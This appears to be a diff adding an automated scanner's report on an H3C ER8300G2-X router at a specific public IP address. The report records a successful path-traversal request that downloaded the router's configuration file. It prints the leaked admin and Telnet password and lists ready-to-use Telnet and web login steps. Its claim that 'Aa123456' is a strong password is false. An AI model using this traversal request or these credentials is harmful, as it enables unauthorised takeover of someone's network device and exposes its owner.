@@ -1,0 +1,48 @@
+H3C 路由器配置泄露检测报告
+============================================================
+
+生成时间: 2026-09-25 10:06:19
+扫描目标: 221.235.158.226
+总结果数: 1
+漏洞数: 1
+------------------------------------------------------------
+
+结果 #1
+  目标: 221.235.158.226
+  端口: 9004
+  状态: ✓ 脆弱
+  类型: 配置泄露
+  指纹: H3C
+  敏感信息:
+    - admpwd: Aa123456
+    - vtypasswd: Aa123456
+    - model: ER8300G2-X
+    - version: ERHMG2V100D024
+    - ntp_server: 0.0.0.0
+    - dns_master: 202.103.44.150
+    - dns_slave: 223.5.5.5
+    - telnet_enable: enable
+    - web_verify: enable
+    - admpwdpromt: A
+    - admapseten: 0
+    - vtypasswdtype: simple
+    - vtyauthmode: password
+  详情: ▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://221.235.158.226:9004/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156598 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Aa123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Aa123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: A (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.103.44.150
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 221.235.158.226 9004
+       密码: Aa123456
+    2. Web登录: http://221.235.158.226:9004/userLogin.asp
+       密码: Aa123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库
+----------------------------------------
